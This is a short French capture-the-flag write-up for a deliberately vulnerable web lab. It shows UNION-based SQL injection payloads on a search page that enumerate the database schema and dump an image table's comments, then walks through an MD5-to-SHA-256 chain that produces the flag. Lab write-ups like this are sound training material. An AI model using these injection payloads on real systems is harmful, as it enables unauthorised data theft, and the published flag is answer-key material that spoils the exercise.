# SQL INJECTION

## Flag
```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## Découverte


Sur la page http://{IP_ADDRESS}/?page=searchimg on injecte cette ligne de sql \
pour connaitre toutes les tables et les colonnes:
```
1 or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
```
On peut faire un schéma de la table list_images:
```
|¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯|
| list_images table  |
|--------------------|
| id                 |
| url                |
| title              |
| comment            |
|____________________|
```
Une image semble être interessant:
```
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```
Toujours avec le meme genre d'injection sql on peut extraire les informations \
de cette image:
```
1 or 1=1 UNION SELECT title, comment from list_images

commentaire:
If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

albatroz:
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```
En suivant les instructions du commentaire on ce retrouve avec:
```
1928e8083cf461a51303633093573c46 -> albatroz -> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## Documentation
- [owasp - sql injection](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [sqlinjection.net](https://www.sqlinjection.net/category/attacks)

---

[RETURN](https://github.com/jlange91/darkly)
